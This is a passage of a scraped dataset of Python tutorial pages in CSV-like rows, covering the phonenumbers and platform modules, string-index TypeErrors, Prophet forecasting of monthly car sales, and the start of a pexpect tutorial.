pn.parse(""+919034xxxxxx"")', '# Using parse phone number for finding timezone', 'timezoneOfPN = tz.time_zones_for_number(givenPN)', '# Printing carrier as the result', 'print(""The timezone of the given phone number is: "", timezoneOfPN)', '# Importing phonenumbers module', 'import phonenumbers as pn', '# Defining multiple phone numbers', 'sampleText = ""You can contact us at +919034xxxxxx in daytime or you can reach out us in night with +119876543210""', '# Searching for a particular phone number', 'resultPN = pn.PhoneNumberMatcher(sampleText, ""IN"")', '# Printing result in the output', 'for desiredPN in resultPN:', 'print(desiredPN)', '# Importing phonenumbers module', 'import phonenumbers as pn', '# Parsing a given phone number', 'givenPN = pn.parse(""+919034xxxxxx"")', '# Validating the parsed number', 'validNumber = pn.is_valid_number(givenPN)', '# Checking possibility of the number', 'possibleNumber = pn.is_possible_number(givenPN)', '# Printing results in the output', 'print(""Is the given phone number is valid?: "", validNumber)', 'print(""Is the given phone number is possible?: "", possibleNumber)']","['The region of the given phone number is:  India', 'The SIM Card operator or carrier of the given phone number is:  Tata Docomo', 'The given phone number after parsed will look like as the following format:', 'Country Code: 91 National Number: 9034xxxxxx', ""The timezone of the given phone number is:  ('Asia/Calcutta',)"", 'PhoneNumberMatch [23,36) +919034xxxxxx', 'Is the given phone number is valid?:  True', 'Is the given phone number is possible?:  True']",[],['|||This module saves our lot of efforts|||This module saves our time for performing operations on phone numbers|||We can perform multiple operations at once on a given phone number using the phonenumbers module|||We can even perform operations on multiple phone numbers at once using this module||||||Knowing the region of the phone number|||Knowing the timezone of a phone number|||knowing carrier of a phone number|||Converting string variable numbers into phonenumber format|||Matching and extracting phone numbers|||Validating a phone number|||']
411,['Python Platform Module'],"[""It is a simple fact that the platform on which our device or system is a crucial factor for the system's performance. We refer to the Operating System (OS) of the system, the application version on which we are performing some action, etc., as the platform for performance analysis. Knowing about the platform is very important because it helps us know whether the application we want to use in the system or function we want to perform is compatible with the OS application we are using. Platform information is also a very much important factor when we are working on someone else's system. But if we are going to check manually about all this information regarding the platform, it will take a while and so much effort from us. It will become even more hectic when we want to perform operations with some new function or work on new applications or software. Therefore, we can't keep checking the platform information manually, and we need something else to perform this task, which Python provides us.""]","['https://www.javatpoint.com/typeerror-string-indices-must-be-an-integer', 'https://www.javatpoint.com/python-phonenumbers-module', 'https://www.javatpoint.com/typeerror-string-indices-must-be-an-integer', 'https://www.javatpoint.com/python-phonenumbers-module', 'https://www.javatpoint.com/typeerror-string-indices-must-be-an-integer']",[],[],"['Introduction to Platform Module in Python', 'Platform Module of Python: Implementation']","['Example:', 'Platform Module of Python: Installation', ""Application 1: Displaying the System' Processor:"", ""Application 2: Displaying platform's architecture:"", 'Application 3: Use of machine() Function:', 'Application 4: Fetching the Network Name:', 'Application 5: Operating System or Platform Name of System:', 'Application 6: Knowing Version of Python Installed:', 'Application 7: Displaying Branch of Python:', 'Application 8: Information of Python Compiler:', 'Application 9: Displaying Build date and time of Python:']",[],"['Following are several examples and implementations of the platform module and its functions:', 'Example 1:', 'Look at the following Python program where we printed processor information in the output:', 'Example 2:', 'Look at the following Python program where we printed architecture information of the system in the output:', 'Example 3:', 'Look at the following Python program where we printed machine type using the machine() function:', 'As we can see, details regarding the machine type of system are printed in the output, which can vary according to the system.', 'Example 4:', 'Look at the following Python program where we printed network type of system using node() function:', 'Example 5:', 'Look at the following Python program where we have used both system() and platform() functions to fetch information from the system:', ""Example 6: Look at the following Python program where we printed installed Python's version in the output:"", 'Example 7:', ""Look at the following Python program where we printed installed Python's SCM branch name in the output:"", 'Example 8:', 'Look at the following Python program where we printed information about the Python compiler in the output:', ""As we can see, installed Python's compiler information is printed in the output, and it may be the same or different for different users."", 'Example 9:', 'Look at the following Python program where we printed information about the build date & time of Python in the output:']","[""We can display the system's processor using the processor() function of the platform module. We can understand the working of the processor() function by using it in an example program."", 'As we can see, the processor name with its details is printed in the output, and this information can vary according to the system in which we are running this example.', ""As we can see, the system's architecture details are printed in the output, and this information can vary according to the system in which we are running this example."", 'As we can see, the network name or mode of the system is printed in the output, and this information can vary according to the system and network it is connected to.', 'As we can see, details regarding the platform and name of the operating system on which we are working are printed in the output, and this information can vary according to different systems and their OS.', ""As we can see, installed Python's version is printed in the output, and it will be different for everyone who is working on different versions of Python."", ""As we can see, installed Python's SCM branch name is printed in the output, and it will be different for everyone working on different branch versions of Python."", ""As we can see, the installed Python version's build date & time is printed in the output, and it may be the same or different for different users according to the Python version present in their system.""]","['Python provides us with the Platform module, which is used to retrieve all information about the platform we are running it. We can fetch all this information simply by executing a Python program. Therefore, we will learn about the platform module of Python in this tutorial and learn how we can implement & use this module to fetch information from our system.', 'Platform module is a Python package that can retrieve all the information regarding the platform we are running the Python. We can fetch all information regarding the system on which we are running the Python by using the functions of this module in a Python program and executing the program. Platform module of Python can fetch the following information from the system:', ""Platform module is very helpful to us whenever we are working on a system in which information is not known to us, and we want to know these details about it. This module plays a crucial role whenever we have to install several software and applications in our system, and we want to check whether our system is compatible with that application or not. We can check the system's compatibility by checking its version, type of machine, and several other properties before installing any application. If we want to understand more practically about the implementation of the platform module of Python then, look at the following example scenario:"", ""Suppose we have to install an external library for Python to perform some specific operation, or we have to install an extension for Python, then we have first to make sure that our system and Python version is compatible with the external library or extension. Here, we can use the platform module of Python to know about all these properties from a system, and that's how this module plays a crucial role in Python."", ""Platform module is an in-built module of Python (It means it comes along with the other in-built Python packages), and that's why we don't have to perform any installation process for this module. We can use the following line of code to import and use the functions of the platform module in a Python program:"", 'Platform module comes with multiple functions used to fetch information regarding multiple properties of the system such as machine type, system name, system version, processor information, etc. We will use some of them here in the implementation part and understand how to retrieve information using the platform module. We will use an example program for each function of the platform module and print the data in the output.', ""Platform module provides us with architecture() function that we can use to know the system's architecture, and we can even print this information in the output. We can understand the working of architecture() function by using it in an example program."", 'If we want to print the type of machine on which we are working, we can use the machine() function of the platform module. The machine() function returns a string in the output, displaying the machine type on which the program is executed. Here, we refer to machine type as the size of the width of registers available in the core of the system we are working on. We can understand the working of machine() function by using it in an example program.', ""The platform provides us the node() function, which fetches information about the node of the system. Node() function of platform module returns a string of results which displays system's network name, or we can say node information. We can understand the working of node() function by using it in an example program."", ""Platform system and operating system (OS) are very similar, and when we print the platform information, it also shows the name of the operating system along with it. Therefore, if we want to know only Operating System's name then, we will use the system() function of the platform module, and if we want to get complete information regarding the platform, then we will use the platform() function. Here, we will understand the implementation of both system() and platform() functions by using them in an example program."", 'Platform module provides us with the python_version() function, which we can use to know about the version of Python installed in our system. This function is very helpful when we have to check the version of Python and if this version is compatible with the latest released modules. We can understand the working of the python_version() function by using it in an example program.', 'From the Branch of Python here, we refer to the SCM branch of Python in which SCM stands for Source Code Manager. With the help of the python_branch() function of the Platform module, we can easily know which SCM branch Python is installed in our system. SCM or Source Code Manage is used to track revisions and updation made in the software. We can understand the working of the python_branch() function by using it in an example program.', 'Platform module provides us with the python_compiler() function, which we can use to get the complete information about the Python compiler present in our system. The python_compiler() function returns a string of results which displays the information about the Python compiler used to compile all Python programs. We can understand the working of the python_compiler() function by using it in an example program.', 'We can even know about the build date and time of the Python version present in our system using the platform module. Platform module provides us with the python_build() function, which returns a string of results that displays information about the build date and time of the Python version present in our system. We can understand the working of the python_build() function by using it in an example program.']","['import platform', '# Importing platform module in the program', 'import platform as plt', '# Fetching processor information', 'processorInformation = plt.processor()', '# Printing results', 'print(""The processor of the system in which we are running the program is: "", processorInformation)', '# Importing platform module in the program', 'import platform as plt', '# Fetching architecture of the system', 'archInfo = plt.architecture()', '# Printing results', 'print(""The architecture of the system in which we are running the program is: "", archInfo)', '# Importing platform module in the program', 'import platform as plt', '# Fetching machine type from the system', 'machInfo = plt.machine()', '# Printing results', 'print(""The type of machine on which we are running the program is: "", machInfo)', '# Importing platform module in the program', 'import platform as plt', '# Fetching node type from the system', 'nodeInfo = plt.node()', '# Printing results', 'print(""The system\'s network name or node details of system on which we are running the program is: "", nodeInfo)', '# Importing platform module in the program', 'import platform as plt', '# Fetching name of operating system', 'osInfo = plt.system()', '# Fetching information of the platform', 'platformInfo = plt.platform()', '# Printing results', 'print(""The system\'s Operating System Name on which we are running the program is: "", osInfo)', 'print(""Platform\'s information on which we are running the program: "", platformInfo)', '# Importing platform module in the program', 'import platform as plt', '# Fetching installed version information', 'pvInfo = plt.python_version()', '# Printing results', 'print(""The version of Python installed in our system is: "", pvInfo)', '# Importing platform module in the program', 'import platform as plt', ""# Fetching installed Python's SCM branch name"", 'pbInfo = plt.python_branch()', '# Printing results', 'print(""The name of SCM branch of Python which is installed in our system is: "", pbInfo)', '# Importing platform module in the program', 'import platform as plt', ""# Fetching installed Python's compiler information"", 'pcInfo = plt.python_compiler()', '# Printing results', 'print(""Information regarding Python compiler present in our system: "", pcInfo)', '# Importing platform module in the program', 'import platform as plt', ""# Fetching information about Python's build date & time"", 'pbInfo = plt.python_build()', '# Printing results', 'print(""Information regarding build date & time of Python version present in our system: "", pbInfo)']","['The processor of the system in which we are running the program is:  Intel64 Family 6 Model 61 Stepping 4, GenuineIntel', ""The architecture of the system in which we are running the program is:  ('64bit', 'WindowsPE')"", 'The type of machine on which we are running the program is:  AMD64', ""The system's network name or node details of the system on which we are running the program is:  Manish-Arora-Laptop"", ""The system's Operating System Name on which we are running the program is:  Windows"", ""Platform's information on which we are running the program:  Windows-10-10.0.19041-SP0"", 'The version of Python installed in our system is:  3.9.0', 'The name of SCM branch of Python which is installed in our system is:  tags/v3.9.0', 'Information regarding Python compiler present in our system:  MSC v.1927 64 bit (AMD64)', ""Information regarding build date & time of Python version present in our system: ('tags/v3.9.0:9cf6752', 'Oct  5 2020 15:34:40')""]",[],"['|||The operating system on which Python is present,|||The version of OS in which program is running,|||Python version,|||Type of Machine or system,|||Node version, etc.|||']"
412,['TypeError string indices must be an integer'],['TypeError is one of the exceptions in the python programming language. This exception occurs when an operation is performed on an unsupported object type or can say not a valid object type.'],"['https://www.javatpoint.com/time-series-forecasting-with-prophet-in-python', 'https://www.javatpoint.com/python-platform-module', 'https://www.javatpoint.com/time-series-forecasting-with-prophet-in-python', 'https://www.javatpoint.com/python-platform-module', 'https://www.javatpoint.com/time-series-forecasting-with-prophet-in-python']","['https://static.javatpoint.com/python/images/typeerror-string-indices-must-be-an-integer1.png', 'https://static.javatpoint.com/python/images/typeerror-string-indices-must-be-an-integer2.png', 'https://static.javatpoint.com/python/images/typeerror-string-indices-must-be-an-integer3.png', 'https://static.javatpoint.com/python/images/typeerror-string-indices-must-be-an-integer4.png', 'https://static.javatpoint.com/python/images/typeerror-string-indices-must-be-an-integer5.png', 'https://static.javatpoint.com/python/images/typeerror-string-indices-must-be-an-integer6.png', 'https://static.javatpoint.com/python/images/typeerror-string-indices-must-be-an-integer7.png', 'https://static.javatpoint.com/python/images/typeerror-string-indices-must-be-an-integer8.png', 'https://static.javatpoint.com/python/images/typeerror-string-indices-must-be-an-integer9.png']",[],['What is TypeError in python?'],"['TypeError: string indices must be an integer', 'Examples of TypeError: String indices must be an integer']",[],"['Let us understand it with the help of examples:', 'Example 1: Given a string named "" JavaTpoint "" and you are required to fetch out the particular character "" T "" from it.', '(Here, we will discuss all the cases in which the type error arises for the above example, along with its solution.)', 'Case 1: We pass the number in string format instead of an integer value in the index.', 'Explanation:', 'Here, we pass the value 4 but not in the integer form, but in the string form as we have assigned it in double-quotes.', 'The output of case 1:', 'Let us understand it in detail, with the help of the correction mentioned below:', 'Correction of case 1:', 'The output of the correction of case 1:', ""Case 2: We pass the index's string value instead of an integer value."", 'Explanation:', 'Let us understand it in detail, with the help of the correction mentioned below:', 'The output of case 2:', 'Correction of case 2:', 'The output of the correction of case 2:', 'Case 1: We pass the number in string format instead of an integer value in the index.', 'Explanation:', 'In the above program, we need to pass the value 3: 6 not in the integer form, but in the string form as we have assigned it in double-quotes.', 'The output of case 1:', 'Let us understand it in detail, with the help of the correction mentioned below:', 'Correction of case 1:', 'The output of the correction of case 1:', 'Case 1: When we pass the string value in the index, instead of the integer value', 'Here in the above program, we pass the string directly rather than the integer value, but in the string form as we have assigned it in double-quotes.', 'The output of case 1:', 'Let us understand it in detail, with the help of the correction mentioned below:', 'Correction of case 1:', 'The output of the correction of case 1:', 'Handling TypeError: String indices must be an integer', 'Let us understand in more detail with the help of an example', 'The output of the above example of exception handling:']","[""In the above case, if we observe that, it generates a type error: string indices must be an integer because, to fetch out the character ' T 'from the alphabet JavaTpoint, we have to pass the index value 4 in integer form instead of a string."", 'Here in the above program, we pass the alphabet directly rather than the integer value, but in the string form as we have assigned it in double-quotes.', 'Example 2: Given a string named "" Wonderful "" and you are required to fetch out the particular slice from the string or can say a part of string "" der "" from it, which we called string slicing.', 'Example 3: For a dictionary example, we have given a dictionary set from which we are required to fetch out the particular key with its corresponding value from the dictionary.', 'In the above case, it is generating a type error: string indices must be an integer because, here to fetch out the particular key say "" Sneha "", from the dictionary d1, we have to pass the index i, which already in integer form instead of a string.', 'In the above examples, we saw that typeError could be generated when we enter the string in the wrong format other than integer values. Although we have seen the correction of all the examples, we must know how to handle all such exceptions.']","[""In the above case, if we observe that, it is generating a type error: string indices must be an integer because, here, to fetch out the character ' o ', from the alphabet JavaTpoint, we have to pass the index value 6 in integer form instead of a string. "", ""In the above case, it is generating a type error: string indices must be an integer because, here, to fetch out the particular part of the string ' der ', from the alphabet Wonderful, we have to pass the index value 3: 6 in integer form instead of a string."", ""To handle these exceptions in the python programming language, we will generally use the ' try ' and ' except ' keyword, try block. We will enter all the test cases, which are mainly as much as possible, in which this is the possibility of generating type error. We will enter the way we handle the above exceptions in except block by printing the user-defined error message.""]","['# Python program to fetch the particular character from the string', 'print(""Enter a string: "")                                      # Enter string JavaTpoint', 's=input()', 'print(""To fetch out the character \'T\'  from the string"")', 's[""4""]                                                              # As the string begans with index value 0,', '# after onwards it will go further by adding 1 to it.', '# Python program to fetch the particular character from the string', 'print(""Enter a string: "")                                      # Enter string JavaTpoint', 's=input()', 'print(""To fetch out the character \'T\'  from the string"")', 's[4]                                                              # As the string begins with index value 0,', '# after onwards it will go further by adding 1 to it.', '# Python program to fetch the particular character from the string', 'print(""Enter a string: "")                                      # Enter string JavaTpoint', 's=input()', 'print(""To fetch out the character \' o \'  from the string"")', ""s['o']                                                              # As the string begans with index value 0,"", '# after onwards it will go further by adding 1 to it.', '# Python program to fetch the particular character from the string', 'print(""Enter a string: "")                                      # Enter string JavaTpoint', 's=input()', 'print(""To fetch out the character \' o \'  from the string"")', 's[6]                                                              # As the string begins with index value 0,', '# after onwards it will go further by adding 1 to it.', '# Python program to fetch the particular part from the string', 'print(""Enter a string: "")                                      # Enter string Wonderful', 's=input()', 'print(""To fetch out the particular slice \' der \'  from the string"")', 's[""3"":""6""]                                                              # As the string begans with index value 0,', '# after onwards it will go further by adding 1 to it.', '# Python program to fetch the particular part from the string', 'print(""Enter a string: "")                                      # Enter string Wonderful', 's=input()', 'print(""To fetch out the particular slice \' der \'  from the string"")', 's[3:6]                                                              # As the string begans with index value 0,', '# after onwards it will go further by adding 1 to it.', '# Python program to fetch out the particular key with its corresponding value', 'd1 = { ""Shivani"" : 19, ""Sneha"" : 31, ""Preeti"" : 8, ""Abhi"" : 50}   # declaring a dictionary', 'for i in d1:', 'print(""Sneha: "" + i[""Sneha""])', 'print(""Abhi: "" + i[""Abhi""])', '# Python program to fetch out the particular key with its corresponding value', 'd1 = { ""Shivani"" : 19, ""Sneha"" : 31, ""Preeti"" : 8, ""Abhi"" : 50}   # declaring a dictionary', 'for i in d1:', 'print(i)', '# python program to handle the type error exception', 'l1 = [""Apple"", ""Mango"", ""Banana"", ""Grapes""]             # declaring a list', 'indices = [0, 1, 2, ""2"", 3]', 'for i in range(len(indices)):', 'try:', 'print(l1[indices[i]])                                        # case which generates TypeError', 'except TypeError:', 'print(""TypeError: Check list of indices"")']",[],[],"['|||It is raised or occurs whenever there is an exception.|||Also, as the name suggests, this type of error arises whenever there is a wrong object, and we perform an unrelated operation on it.|||There are mainly three types of errors in the Python programming language: syntax error, logical error, and exception.|||This type of error lies in the category of exception error.|||The user can easily handle the type error using the raise keyword.||||||As we all know, the basic structure of the string consists of index values.|||The starting value of the string begins with the index value 0, and it will continue till the length of the given string.|||TypeError arises whenever we want to fetch out the particular character of the string with the specified index value. Still, instead of entering the integer value in the index, we will enter another value of a different object type.|||For example, if we want to fetch character 2 from the string, we enter the index as an integer instead of an integer, which will raise a type error string indices must be an integer.|||']"
413,['Time Series Forecasting with Prophet in Python'],['Time Series forecasting is considered a challenging task as there are various methods that we could utilize and various hyperparameters for each method.'],"['https://www.javatpoint.com/python-pexpect-module', 'https://www.javatpoint.com/typeerror-string-indices-must-be-an-integer', 'https://www.javatpoint.com/python-pexpect-module', 'https://www.javatpoint.com/typeerror-string-indices-must-be-an-integer', 'https://www.javatpoint.com/python-pexpect-module']","['https://static.javatpoint.com/python/images/time-series-forecasting-with-prophet-in-python.png', 'https://static.javatpoint.com/python/images/time-series-forecasting-with-prophet-in-python2.png']",[],"['Understanding the Prophet Forecasting Library', 'How to Install the Python Prophet library?', 'Understanding the working of the Prophet library', 'Forecasting car sales using Prophet in Python']","['Verifying the Installation', 'Loading and Summarizing Dataset', 'Loading and Plotting Dataset', 'Fitting Prophet Model', 'Making an in-sample Forecast']","['Note: The first column in the output is a row index and is not a part of the dataset, just a helpful utility that Pandas uses to order rows.']","['In the following tutorial, we will discuss the use of the Facebook Prophet Library in order to forecast time series.', 'Throughout the tutorial, we will learn:', ""So, let's get begun."", 'Prophet, also known as ""Facebook Prophet"", is an open-source library to forecast one variable (univariate) time series designed by Facebook.', 'The Prophet library offers two interfaces, involving Python and R. We will mainly focus on the Python interface for this tutorial.', 'The primary step is to install the Prophet library with the help of the pip installer.', 'Once the module is installed, we can verify it by creating an empty Python program file and writing an import statement as follows:', 'File: verify.py', 'Now, save the above file and execute it using the following command in a terminal:', 'Let us now understand the working of the Python Prophet Library using the Dataset of monthly car sales.', 'Let us begin by loading and summarizing the Dataset', 'The prophet needs data to be stored in the form of Pandas Data frames. Thus, we will load and summarize the data with the help of the Pandas library.', 'Let us consider the following example demonstrating the same:', 'Explanation:', 'A time-series dataset is incomplete until we plot it.', 'Plotting a Time series allows us to show if there is a trend, a seasonal cycle, outliers, and many more. It gives us a feel for the data.', 'We can plot the data easily in Pandas by calling the plot() function on the Data frame.', 'Let us consider the following example illustrating the same:', 'Explanation:', 'Now that we are familiar with the dataset, let us explore how we can utilize the Prophet library to make forecasts.', 'In the following section, we will discuss how to use the Prophet library to forecast the car sales dataset.', 'Let us begin by fitting a model on the dataset.', 'Now, let us consider the following syntax illustrating how we can modify the loaded dataset to have an expected structure.', 'Explanation:', 'In the above syntax, we have altered the name of the data frame columns to have an expected structure.', 'Now, let us see the complete example of fitting a Prophet model on the dataset of the car sales as follows:', 'Explanation:', 'The next step is to make a forecast.', 'It will help make a forecast on historical data.', 'We can make a forecast on data utilized as input to train the model. Ideally, the model has seen the data before and would make a proper prediction.', 'However, this is not the scenario as the model attempts to generalize across all cases in the data.', 'Let us consider the following syntax demonstrating the same.', 'Explanation:', 'We can now provide the data frame to the predict() function in order to evaluate the forecast.', 'The consequence of the predict() function will be a data frame consisting of multiple columns. Perhaps the most important columns are:', 'Let us consider the following snippet of code where we have printed the first few predictions:', 'Explanation:', 'In the above snippet of code, we have printed the imported columns of the first few predictions.', 'Here is the syntax for the same:', 'Explanation:', 'Now, let us see the complete program of making an in-sample forecast.', 'Explanation:', 'As we can observe, the above snippet of code will return the forecast of the last 12 months of the dataset.', 'At last, we can understand that the forecasted 12 months is a good match for the real observations, specifically when the bounds are considered.']","['Prophet implements what they refer to as an additive time series forecasting model, and the implementation supports seasonality, trends, and holidays.', 'As per the documentation of Prophet Package, it implements a procedure to forecast time series data on the basis of an additive model where non-linear trends are fit with daily, weekly, yearly seasonality, in addition to the holiday effects.', 'It is designed as easy to use and entirely automatic. For instance, point it at a time series and get a forecast. It is intended for internal company utilization, such as forecasting sales, capacity, and a lot more.', 'We can load the data directly from the URL by calling the Pandas read_csv() function, summarizing the shape (number of rows and columns) of the data, and looking at the first few rows of the data.', ""As a result, we can observe that there is 108 months' worth of data and two columns. The first column is the month and the second is the number of sales."", 'As a result, we can clearly view the trend in sales over time and a monthly seasonal pattern to the sales. These are patterns we expect the forecast model to consider.', 'In order to use Prophet for forecasting, we will first define a Prophet() object and configure it. We will then call the fit() function and pass the data to fit it on the dataset.', 'The Prophet() object accepts parameters to configure the model type according to preferences, like the growth type, the seasonality type, and more. By default, the model will work hard to figure out almost everything automatically.', 'We have imported the required libraries and loaded the data in the above snippet of code. We have then prepared the expected names of the columns. At last, we have defined the prophet model and fit the dataset to it.', 'This process is known as making an in-sample (in training set sample) forecast and reviewing the outputs can provide insight into how good the model is. That is, how well it learned the training data.', ""A forecast is made by calling the predict() function and passing a data frame consisting of one column named 'ds' and rows with date-times for predicted intervals."", 'In the above snippet of code, we have used the plot() function on the model and passed it a result data frame. We have then used the show() function to display the resulting graph.', 'The first five months of the prediction are reported, and we can also observe that the values are not too varied from the original sales values in the dataset.', 'Moreover, we can also notice that a plot has been created. The training data are represented as black dots, and the forecast is a blue line with upper and lower bounds in a blue shaded region.']","['The Prophet library is an open-source library designed to make forecasts for univariate datasets of time series. It is easy to use and developed to automatically find a good set of hyperparameters for the model to make skillful forecasts for data with the help of trends and seasonal structure by default.', ""In order to install the Python module, we need 'pip', a framework to manage packages required to install the modules from the trusted public repositories. Once we have 'pip', we can install the prophet library using the command from a Windows command prompt (CMD) or terminal as shown below:"", 'If the above Python program file does not raise any exception and return the installer version number, the Prophet library is installed properly. However, in the case where an exception is raised, try reinstalling the library, and it is also recommended to refer to the official documentation of the library.', 'This Dataset is a standard univariate time series dataset consisting of both a trend as well as seasonality. The Dataset contains 108 months of data, and a naïve persistence forecast can accomplish a mean absolute error of around 3,235 sales, offering a lower error limit.', 'We have imported the read_csv() function from the Pandas library in the above snippet of code. We have then initialized the path where the data as a CSV file is stored and used the imported function to read that file and convert it into a Data frame. We have then summarized the shape of the data using the shape attribute. At last, we have printed the first few rows of data for the users.', 'In the above snippet of code, we have imported the read_csv function along with the pyplot module from their respective libraries. We have then initialized the path of the CSV file. We have then used the read_csv function to read that file and convert it into a data frame. We have then used the plot() function to plot the graph and the show() function to display it for the users.', ""The fit() function accepts a Data frame of Time Series data. The data frame should have a particular format. The name of the first column must be 'ds' and consists of the date times. The name of the second column must be 'y' and consists of the observations."", 'This statement implies that we change the names of the columns in the dataset. It also wants that the first column be converted to date-time objects if they are not already. For example, this can be done by loading the dataset using the appropriate parameters to the read_csv() function.', 'There are various ways to create this ""the_forecast"" data frame. For example, the last twelve months in the dataset, create a string for every month. In the following case, we will loop over one year of dates. We will then convert the list of dates into a data frame and transform the values of the string into datetime objects.', ""In the above snippet of code, we have defined a list as future. We have then used the for-loop for iterating through the months of 1968 and returned the data of that period. We have then framed this data into a data frame with the column name 'ds' and set this column to display date-time."", 'Prophet also offers an in-built utility to visualize the prediction in the context of the training dataset. This can be accomplished using the plot() function on the model and passing it a resulted data frame. It will create a plot of the training dataset and overlay the prediction with the upper and lower bounds for the forecast dates.']","['$ python.exe -m pip install fbprophet', '# importing the library', 'import fbprophet', '# printing the version number', 'print(""Prophet %s"" %fbprophet.__version__)', '$ python verify.py', '# importing the required function', 'from pandas import read_csv', '# loading the data', ""filepath = '/content/cars_monthly_sale.csv'"", 'dFrame = read_csv(filepath, header = 0)', '# summarizing shape', 'print(dFrame.shape)', '# displaying the first few rows', 'print(dFrame.head())', '# importing the required modules from libraries', 'from pandas import read_csv', 'from matplotlib import pyplot', '# loading the data', ""filepath = '/content/cars_monthly_sale.csv'"", 'dFrame = read_csv(filepath, header = 0)', '# plotting the time series', 'dFrame.plot()', 'pyplot.show()', '# preparing the expected column names', ""dFrame.columns = ['ds', 'y']"", ""dFrame['ds']= to_datetime(dFrame['ds'])"", '# importing the required functions and modules', 'from pandas import read_csv', 'from pandas import to_datetime', 'from fbprophet import Prophet', '# loading the data', ""filepath = '/content/cars_monthly_sale.csv'"", 'dFrame = read_csv(filepath, header = 0)', '# preparing the expected names of the columns', ""dFrame.columns = ['ds', 'y']"", ""dFrame['ds']= to_datetime(dFrame['ds'])"", '# defining the model', 'prophet_model = Prophet()', '# fitting the model', 'prophet_model.fit(dFrame)', '# defining the period for which we want a prediction', 'future = list()', 'for i in range(1, 13):', ""date = '1968-%02d' % i"", 'future.append([date])', 'future = DataFrame(future)', ""future.columns = ['ds']"", ""future['ds'] = to_datetime( future['ds'] )"", '# summarizing the forecast', ""print(the_forecast[['ds', 'yhat', 'yhat_lower', 'yhat_upper']].head())"", '# plotting the forecast', 'prophet_model.plot(the_forecast)', 'pyplot.show()', '# importing the required functions and modules', 'from pandas import read_csv', 'from pandas import to_datetime', 'from pandas import DataFrame', 'from fbprophet import Prophet', 'from matplotlib import pyplot', '# loading the data', ""filepath = '/content/cars_monthly_sale.csv'"", 'dFrame = read_csv(filepath, header = 0)', '# preparing the expected column names', ""dFrame.columns = ['ds', 'y']"", ""dFrame['ds']= to_datetime(dFrame['ds'])"", '# defining the model', 'prophet_model = Prophet()', '# fitting the model', 'prophet_model.fit(dFrame)', '# defining the period for which we want a prediction', 'future = list()', 'for i in range(1, 13):', ""date = '1968-%02d'%i"", 'future.append([date])', 'future = DataFrame(future)', ""future.columns = ['ds']"", ""future['ds']= to_datetime( future['ds'] )"", '# using the model to make a forecast', 'the_forecast = prophet_model.predict(future)', '# summarizing the forecast', ""print(the_forecast[['ds', 'yhat', 'yhat_lower', 'yhat_upper']].head())"", '# plotting the forecast', 'prophet_model.plot(the_forecast)', 'pyplot.show()']","['Prophet 0.7.1', '(108, 2)', 'Month    Sales', '0  1960-01   6550.0', '1  1960-02   8728.0', '2  1960-03  12026.0', '3  1960-04  14395.0', '4  1960-05  14587.0', 'INFO:fbprophet:Disabling weekly seasonality. Run prophet with weekly_seasonality=True to override this.', 'INFO:fbprophet:Disabling daily seasonality. Run prophet with daily_seasonality=True to override this.', 'INFO:fbprophet:Disabling weekly seasonality. Run prophet with weekly_seasonality=True to override this.', 'INFO:fbprophet:Disabling daily seasonality. Run prophet with daily_seasonality=True to override this.', 'ds          yhat    yhat_lower    yhat_upper', '0 1968-01-01  14334.737769  12802.203888  15949.723255', '1 1968-02-01  14905.955964  13337.420778  16552.309312', '2 1968-03-01  20842.150502  19242.348853  22460.757530', '3 1968-04-01  22870.095215  21341.988780  24473.330178', '4 1968-05-01  24176.211162  22508.496756  25726.410744']",[],"[""|||The forecast date-time ('ds').|||The forecasted value ('yhat').|||The lower and upper bounds on the predicted value ('yhat_lower' and 'yhat\xad_upper') that provide uncertainty of the forecast.|||&&&|||The prophet is an open-source library designed to forecast univariate time series data automatically and developed by Facebook.|||How to fit Prophet models and utilize them in order to make in-sample and out-of-sample forecasts?|||How to evaluate a Prophet model on a hold-out dataset?|||""]"
414,['Python Pexpect Module'],"['We all know about the desktop operating systems and their functions and working. Some of the most famous operating systems which all of us must have heard of are Windows, Linux, macOS, and ChromeOS. Among them, chromeOS is also a Linux-based operating system for the desktop, which increases the popularity of Linux and Linux-based operating systems. Linux is a very popular operating system among programmers and developers because of the enhanced security features. But at the same time, it is not that much among general people, and the biggest reason behind this trend is the complex commands used to operate and work on the Linux operating system-based desktop.']","['https://www.javatpoint.com/python-optparse-module', 'https://www.javatpoint.com/time-series-forecasting-with-prophet-in-python', 'https://www.javatpoint.com/python-optparse-module', 'https://www.javatpoint.com/time-series-forecasting-with-prophet-in-python', 'https://www.javatpoint.com/python-optparse-module']",['https://static.javatpoint.com/python/images/python-pexpect-module.png'],[],"['Introduction to Pexpect Module of Python', 'Installation of Python Pexpect Module', 'Automating Linux Commands with Pexpect Module']","['Method 1: Using run() Method', 'Method 2: Using Spawn Class Method', 'Method 3: Using the sendline Method']","['Note: All the pexpect module methods listed above can only run in UNIX-based operating systems, and none of them are available for windows. Therefore, if we run these methods or, example programs, it will show an error in the output. First, we have to set up a Virtual environment for UNIX-based OS if we want to run these programs in the Windows operating system.']","['Following are some useful functions that we can perform using the pexpect module of Python:', 'Following are the three methods of pexpect module which we can use to automate Linux commands:', 'Syntax for run() Method:', 'Following is the syntax for using the run() method of the pexpect module to execute Linux commands:', ""Let's understand the implementation of the run() method for executing Linux commands through the following example program."", 'Example 1: Look at the following Python program where we executed a Linux command:', 'As we can see, the Linux command is successfully executed, and the result is printed in the output.', 'Explanation:', 'Syntax for Spawn class:', 'Syntax for the expect() Function:', 'We have to use the expect() function in the child class of spawn method like the syntax given below:', 'Arguments: As we can see in the syntax of expect() function given above, this function takes the following three arguments:', ""Let's understand the implementation of the spawn class method with expect() function in the child class through the following example program."", 'Example 2: Look at the following Python program where we have matched input pattern defined in the spawn class:', 'Explanation:', 'Syntax for the sendline Method:', 'Following is the syntax for using the sendline method of pexpect module for writing matching pattern for child process:', 'As we can see, the sendline function takes only one argument, which is the pattern for the child process.', 'We can understand the implementation and application of the sendline method through the following example program:', 'Example 3: Look at the following Python program where we have used the sendline() function to write the matching pattern for the child process:', 'Explanation:']","['Here, in this part, we will automate Linux commands through Python programs by Importing the Pexpect module into them. We have three methods in the pexpect module, which we can use to automate the Linux commands through a Python program.', 'We will understand the implementation of all three methods that are listed above by using them in an example program. We will use a separate example program for each method and automate the Linux command through it.', 'As we can see in the syntax above, we have provided a Linux command as an argument in the run() method. When we run the program, the run() method will execute the Linux command provided and show the result in the output.', 'As we can see, we have provided a Linux command as an argument in the spawn class, and it can be replaced by the shell command, which has to be executed.', 'The timeout value used in the expect() function to raise the return value will be pexpect.TIMEOUT. We can use the searchwindow option of the expect() function to set the maxread value of the class.']","[""Now, talking about Linux, it is a desktop operating system from the family of UNIX-like operating systems, first released by Linus Torvalds in 1991 